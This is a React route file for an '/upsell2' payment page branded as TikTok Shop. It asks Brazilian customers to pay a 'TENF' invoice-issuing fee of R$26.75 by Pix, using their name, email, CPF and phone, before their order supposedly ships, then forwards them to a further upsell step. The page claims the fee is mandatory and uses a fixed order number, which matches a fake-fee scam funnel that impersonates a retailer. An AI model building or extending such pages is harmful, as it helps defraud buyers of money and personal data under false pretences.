import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { goWithTracking } from "@/lib/tracking";
import { markCurrentPixPaid, setNextStep } from "@/components/upsell/funnel";
import { CreditCard, Info, HelpCircle } from "lucide-react";
import PixModal from "@/components/upsell/PixModal";
import { useCustomerData } from "@/components/upsell/useCustomerData";
import { usePixPrefetch } from "@/components/upsell/usePixPrefetch";
import { upsellTokens, shadowCard, PINK } from "@/components/upsell/tokens";

const AMOUNT = 26.75;
const DETAILS = "TENF Taxa de Emissao";

export const Route = createFileRoute("/upsell2")({
  head: () => ({
    meta: [
      { title: "TENF - Taxa de Nota Fiscal | TikTok Shop" },
      {
        name: "description",
        content: "Pague a TENF do seu pedido para liberar o despacho em ate 24 horas.",
      },
      { property: "og:title", content: "TENF - Taxa de Nota Fiscal | TikTok Shop" },
      {
        property: "og:description",
        content: "Pague a TENF do seu pedido para liberar o despacho em ate 24 horas.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: Upsell2,
});

function Upsell2() {
  const [showPixModal, setShowPixModal] = useState(false);
  const { data: customerData, isLoaded: customerLoaded } = useCustomerData();
  const { data: prefetchedPix, loading: prefetchLoading, error: prefetchError } = usePixPrefetch(
    AMOUNT,
    DETAILS,
    { data: customerData, isLoaded: customerLoaded },
    "upsell",
  );

  useEffect(() => {
    setNextStep("/upsell3");
  }, []);

  const handleSuccess = () => {
    setShowPixModal(false);
    localStorage.setItem("up2PaymentApproved", "true");
    markCurrentPixPaid("/upsell3");
    goWithTracking("/upsell3");
  };

  return (
    <div className="min-h-screen bg-secondary/30 flex flex-col" style={upsellTokens}>
      {/* Header */}
      <div className="bg-card py-4 border-b border-border">
        <img src="/images/ttk-shop-up.png" alt="TikTok Shop" className="h-8 mx-auto" />
      </div>

      <div className="flex-1 p-4 space-y-4 max-w-md mx-auto w-full">
        {/* Status do Pedido */}
        <div className={`bg-card rounded-2xl p-6 ${shadowCard}`}>
          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center">
              <CreditCard className="w-6 h-6 text-primary" />
            </div>
            <h1 className="text-xl font-bold text-foreground">Status do Pedido</h1>
          </div>

          <div className="border border-border rounded-xl p-4 space-y-3">
            <div className="flex justify-between items-center">
              <span className="text-muted-foreground text-sm">Número do pedido:</span>
              <span className="text-primary font-semibold">00044792</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-muted-foreground text-sm">Status:</span>
              <span className="text-primary font-semibold">Aguardando pagamento</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-muted-foreground text-sm">Valor da TENF:</span>
              <span className="text-primary font-semibold">
                R$ {AMOUNT.toFixed(2).replace(".", ",")}
              </span>
            </div>
          </div>
        </div>

        {/* Pagamento Pendente */}
        <div className={`bg-card rounded-2xl p-6 ${shadowCard}`}>
          <div className="flex items-center gap-2 mb-3">
            <Info className="w-5 h-5 text-primary" />
            <h2 className="text-lg font-bold text-foreground">Pagamento Pendente</h2>
          </div>
          <p className="text-muted-foreground text-sm leading-relaxed">
            Seu pedido está quase pronto para ser enviado! Para finalizar o processo, precisamos que
            você realize o pagamento da <strong className="text-foreground">TENF</strong> (Taxa de
            Emissão da Nota Fiscal) no valor de R$ {AMOUNT.toFixed(2).replace(".", ",")}.
          </p>
        </div>

        {/* Botão */}
        <button
          onClick={() => setShowPixModal(true)}
          className="w-full font-bold py-4 px-6 rounded-xl text-base transition-transform active:scale-[0.98] shadow-lg uppercase tracking-wide text-white"
          style={{ backgroundColor: PINK }}
        >
          Pagar TENF - R$ {AMOUNT.toFixed(2).replace(".", ",")}
        </button>

        {/* Por que preciso pagar */}
        <div className={`bg-card rounded-2xl p-6 ${shadowCard}`}>
          <div className="flex items-center gap-2 mb-3">
            <HelpCircle className="w-5 h-5 text-primary" />
            <h2 className="text-lg font-bold text-foreground">Por que preciso pagar a TENF?</h2>
          </div>
          <p className="text-muted-foreground text-sm leading-relaxed">
            A TENF é uma taxa obrigatória para emissão da nota fiscal do seu produto. Sem esse
            pagamento, não podemos finalizar o processo de despacho. Após o pagamento, seu pedido
            será enviado em até 24 horas.
          </p>
        </div>
      </div>

      <PixModal
        isOpen={showPixModal}
        onClose={() => setShowPixModal(false)}
        amount={AMOUNT}
        title="TENF - Taxa de Nota Fiscal"
        customerName={customerData.name}
        customerEmail={customerData.email}
        customerCpf={customerData.cpf}
        customerPhone={customerData.phone}
        details={DETAILS}
        paymentType="upsell"
        onSuccess={handleSuccess}
        prefetchedData={prefetchedPix}
        prefetchLoading={prefetchLoading}
        prefetchError={prefetchError}
      />
    </div>
  );
}
